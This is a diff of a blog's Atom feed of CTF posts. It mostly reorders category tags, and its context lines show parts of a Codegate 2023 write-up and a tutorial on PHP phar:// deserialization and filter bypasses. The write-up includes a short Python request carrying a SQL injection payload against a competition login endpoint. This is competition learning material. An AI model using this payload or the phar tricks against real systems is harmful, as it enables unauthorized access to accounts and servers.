@@ -4,11 +4,11 @@
     <title>Cubic Y³ • Posts by &#34;ctf&#34; category</title>
     <link href="http://cubicy.icu" />
     <updated>2023-08-29T07:05:06.000Z</updated>
+    <category term="Misc" />
+    <category term="Write-Up" />
+    <category term="出题" />
     <category term="CISCN" />
     <category term="web" />
-    <category term="Write-Up" />
-    <category term="Misc" />
-    <category term="出题" />
     <category term="Hackergame" />
     <category term="SchoolBus" />
     <category term="Rust" />
@@ -18,10 +18,10 @@
     <category term="冰菓" />
     <category term="古籍研究社" />
     <category term="Treap" />
-    <category term="BST" />
-    <category term="Stack" />
     <category term="图论" />
     <category term="Kruskal" />
+    <category term="BST" />
+    <category term="Stack" />
     <category term="Splay" />
     <category term="数链剖分" />
     <category term="持久化" />
@@ -36,18 +36,18 @@
     <category term="Compiler" />
     <category term="Computer Science" />
     <category term="On Going" />
+    <category term="NLP" />
+    <category term="Fuzzing" />
+    <category term="AFL" />
     <category term="Math" />
     <category term="Translation" />
     <category term="Yoneda Lemma" />
     <category term="Miscellaneous" />
-    <category term="NLP" />
-    <category term="Fuzzing" />
-    <category term="AFL" />
     <entry>
         <id>http://cubicy.icu/2023/08/29/CODEGATE2023/</id>
         <title>Codegate 2023 Partial Write-Up (Web/Misc)</title>
         <link rel="alternate" href="http://cubicy.icu/2023/08/29/CODEGATE2023/"/>
-        <content type="html">&lt;h1 id=&#34;Codegate-2023-部分Write-Up-Web-x2F-Misc&#34;&gt;&lt;a href=&#34;#Codegate-2023-部分Write-Up-Web-x2F-Misc&#34; class=&#34;headerlink&#34; title=&#34;Codegate 2023 部分Write-Up (Web&amp;#x2F;Misc)&#34;&gt;&lt;/a&gt;Codegate 2023 部分Write-Up (Web&amp;#x2F;Misc)&lt;/h1&gt;&lt;p&gt;这次去韩国参加了Codegate 2023的决赛！把Web部分的题解在此释出，其他游记&amp;#x2F;照片另开一文。  &lt;/p&gt;
+        <content type="html">&lt;h1 id=&#34;Codegate-2023-部分Write-Up-Web-Misc&#34;&gt;&lt;a href=&#34;#Codegate-2023-部分Write-Up-Web-Misc&#34; class=&#34;headerlink&#34; title=&#34;Codegate 2023 部分Write-Up (Web&amp;#x2F;Misc)&#34;&gt;&lt;/a&gt;Codegate 2023 部分Write-Up (Web&amp;#x2F;Misc)&lt;/h1&gt;&lt;p&gt;这次去韩国参加了Codegate 2023的决赛！把Web部分的题解在此释出，其他游记&amp;#x2F;照片另开一文。  &lt;/p&gt;
 &lt;h2 id=&#34;Warmup&#34;&gt;&lt;a href=&#34;#Warmup&#34; class=&#34;headerlink&#34; title=&#34;Warmup&#34;&gt;&lt;/a&gt;Warmup&lt;/h2&gt;&lt;p&gt;没咋看。似乎是XSS绕绕。&lt;/p&gt;
 &lt;h2 id=&#34;Pwn&#34;&gt;&lt;a href=&#34;#Pwn&#34; class=&#34;headerlink&#34; title=&#34;Pwn&#34;&gt;&lt;/a&gt;Pwn&lt;/h2&gt;&lt;p&gt;是的，这题就叫Pwn（与之相对的是Pwn分类里有道题叫Web）&lt;br&gt;解法：没咋看。应该是比较水的一题。经典数组绕过  &lt;/p&gt;
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;data = &lt;span class=&#34;string&#34;&gt;&amp;quot;username[0]=\\&amp;#x27; union select password from USER WHERE username=&amp;#x27;admin&amp;#x27; -- &amp;amp;username[1]=2&amp;amp;password=3&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://3.35.198.7:2929/login&amp;quot;&lt;/span&gt;, data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -114,9 +114,9 @@
 &lt;/ul&gt;
 &lt;p&gt;相信也可以发现国赛这种patch难度远低于attack的难度。建议&lt;strong&gt;做题的初期当作没有攻击得分，先patch了再说&lt;/strong&gt;。&lt;/p&gt;
 </content>
+        <category term="Write-Up" />
         <category term="CISCN" />
         <category term="web" />
-        <category term="Write-Up" />
         <updated>2023-07-06T16:28:12.000Z</updated>
     </entry>
     <entry>
@@ -183,8 +183,8 @@
 &lt;p&gt; I have made my best to make the solving process more natural. I hope you enjoy digging deep into the problem. You’ll earn much more fun than those who can just use tools written by others without understanding fundamental principles (like me).&lt;/p&gt;
 &lt;p&gt;ご武運を！&lt;/p&gt;
 </content>
-        <category term="Write-Up" />
         <category term="Misc" />
+        <category term="Write-Up" />
         <category term="出题" />
         <updated>2022-07-03T15:43:00.000Z</updated>
     </entry>
@@ -240,7 +240,7 @@
 &lt;p&gt;在上面的程序执行之后，我们会发现它输出了“Destruct called”.这是由于phar被解析的时候，metadata被反序列化了，于是该实例被析构时调用__destruct函数。这便是反序列化漏洞的来由。&lt;/p&gt;
 &lt;p&gt;PHP ≥5.3默认支持phar文件；而在PHP8中，该漏洞被修复：metadata不会自动被反序列化了。（来源请求）&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;phar-x2F-x2F-是什么&#34;&gt;&lt;a href=&#34;#phar-x2F-x2F-是什么&#34; class=&#34;headerlink&#34; title=&#34;phar:&amp;#x2F;&amp;#x2F;是什么&#34;&gt;&lt;/a&gt;&lt;strong&gt;phar:&amp;#x2F;&amp;#x2F;是什么&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;前面提到，我们解析phar文件常常使用phar:&amp;#x2F;&amp;#x2F;伪协议。CTF中，由于伪协议提供了一系列对于文件的封装协议，使得当源程序有可控的文件包含函数时，我们有机会利用这些协议控制其返回值或是完成一些预料外操作（例如反序列化）。作为伪协议的一种，由于phar本质上就是一个特殊的压缩文件，所以phar:&amp;#x2F;&amp;#x2F;和zip:&amp;#x2F;&amp;#x2F;其实有很多相似之处，都可以访问压缩包中的子文件，并且zip:&amp;#x2F;&amp;#x2F;需要文件绝对路径，phar:&amp;#x2F;&amp;#x2F;并不需要。（来源请求）&lt;/p&gt;
+&lt;h2 id=&#34;phar-是什么&#34;&gt;&lt;a href=&#34;#phar-是什么&#34; class=&#34;headerlink&#34; title=&#34;phar:&amp;#x2F;&amp;#x2F;是什么&#34;&gt;&lt;/a&gt;&lt;strong&gt;phar:&amp;#x2F;&amp;#x2F;是什么&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;前面提到，我们解析phar文件常常使用phar:&amp;#x2F;&amp;#x2F;伪协议。CTF中，由于伪协议提供了一系列对于文件的封装协议，使得当源程序有可控的文件包含函数时，我们有机会利用这些协议控制其返回值或是完成一些预料外操作（例如反序列化）。作为伪协议的一种，由于phar本质上就是一个特殊的压缩文件，所以phar:&amp;#x2F;&amp;#x2F;和zip:&amp;#x2F;&amp;#x2F;其实有很多相似之处，都可以访问压缩包中的子文件，并且zip:&amp;#x2F;&amp;#x2F;需要文件绝对路径，phar:&amp;#x2F;&amp;#x2F;并不需要。（来源请求）&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;小tricks&#34;&gt;&lt;a href=&#34;#小tricks&#34; class=&#34;headerlink&#34; title=&#34;小tricks&#34;&gt;&lt;/a&gt;&lt;strong&gt;小tricks&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&#34;绕过前缀过滤&#34;&gt;&lt;a href=&#34;#绕过前缀过滤&#34; class=&#34;headerlink&#34; title=&#34;绕过前缀过滤&#34;&gt;&lt;/a&gt;绕过前缀过滤&lt;/h3&gt;&lt;p&gt;队里师傅的几个example可以类比使用，都是在前缀非phar:&amp;#x2F;&amp;#x2F;的情况下调用了phar:&amp;#x2F;&amp;#x2F;&lt;/p&gt;
 &lt;p&gt;compress.bzip2和compress.zlib&lt;/p&gt;
